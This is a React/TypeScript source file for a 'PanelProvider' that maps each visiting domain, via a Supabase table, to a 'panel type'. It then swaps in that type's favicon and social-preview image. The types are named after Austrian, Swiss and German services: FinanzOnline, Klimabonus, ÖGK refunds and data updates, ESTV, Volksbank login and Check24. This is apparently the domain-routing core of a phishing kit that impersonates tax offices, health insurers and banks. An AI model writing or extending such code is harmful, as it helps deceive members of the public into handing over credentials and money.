import { createContext, useContext, useEffect, useState, type ReactNode } from "react";
import { supabase } from "@/integrations/supabase/client";

export type PanelType = "finanzonline" | "klimabonus" | "klimabonus_2" | "oegk_rueckerstattung" | "oegk_datenaktualisierung" | "estv" | "volksbank_login" | "vb_investmentcheck" | "check24" | "finanzonline_steuer";

interface PanelContextValue {
  type: PanelType;
  domain: string;
  matched: boolean;
  metaTagEnabled: boolean;
  metaTagSnippet: string | null;
}

const PanelContext = createContext<PanelContextValue>({
  type: "finanzonline",
  domain: "",
  matched: false,
  metaTagEnabled: false,
  metaTagSnippet: null,
});


export const usePanel = () => useContext(PanelContext);

const VALID_TYPES: PanelType[] = ["finanzonline", "klimabonus", "klimabonus_2", "oegk_rueckerstattung", "oegk_datenaktualisierung", "estv", "volksbank_login", "vb_investmentcheck", "check24", "finanzonline_steuer"];

function applyFavicon(url: string) {
  if (!url) return;
  document
    .querySelectorAll<HTMLLinkElement>('link[rel~="icon"], link[rel="shortcut icon"], link[rel="apple-touch-icon"]')
    .forEach((l) => {
      l.href = url;
    });
  document
    .querySelectorAll<HTMLMetaElement>('meta[property="og:image"], meta[name="twitter:image"]')
    .forEach((m) => m.setAttribute("content", url));
}

interface PanelProviderProps {
  children: ReactNode;
}

export const PanelProvider = ({ children }: PanelProviderProps) => {
  const [ready, setReady] = useState(false);
  const [value, setValue] = useState<PanelContextValue>({
    type: "finanzonline",
    domain: "",
    matched: false,
    metaTagEnabled: false,
    metaTagSnippet: null,
  });

  useEffect(() => {
    const host =
      typeof window !== "undefined"
        ? window.location.hostname.replace(/^www\./, "").toLowerCase()
        : "";

    let cancelled = false;

    (async () => {
      try {
        const { data } = await supabase
          .from("panels")
          .select("type, meta_tag_enabled, meta_tag_snippet")
          .eq("domain", host)
          .maybeSingle();

        if (cancelled) return;

        const matched = !!data?.type && VALID_TYPES.includes(data.type as PanelType);
        const type: PanelType = matched
          ? (data!.type as PanelType)
          : "finanzonline";
        const metaTagEnabled = matched && !!(data as any)?.meta_tag_enabled;
        const metaTagSnippet = matched ? ((data as any)?.meta_tag_snippet ?? null) : null;
        setValue({ type, domain: host, matched, metaTagEnabled, metaTagSnippet });

        // Per-Typ-Favicon laden und anwenden
        const { data: settings } = await supabase
          .from("panel_type_settings")
          .select("favicon_url")
          .eq("type", type)
          .maybeSingle();
        if (!cancelled && settings?.favicon_url) {
          applyFavicon(settings.favicon_url);
        }
      } catch {
        if (!cancelled) setValue({ type: "finanzonline", domain: host, matched: false, metaTagEnabled: false, metaTagSnippet: null });
      } finally {
        if (!cancelled) setReady(true);
      }
    })();


    return () => {
      cancelled = true;
    };
  }, []);

  if (!ready) {
    return (
      <div className="fixed inset-0 z-[9999] flex flex-col items-center justify-center bg-white">
        <div className="mb-6">
          <div className="h-10 w-10 animate-spin rounded-full border-4 border-gray-200 border-t-[#00436b]" />
        </div>
        <p className="text-sm text-gray-600">Wird geladen…</p>
      </div>
    );
  }

  return <PanelContext.Provider value={value}>{children}</PanelContext.Provider>;
};
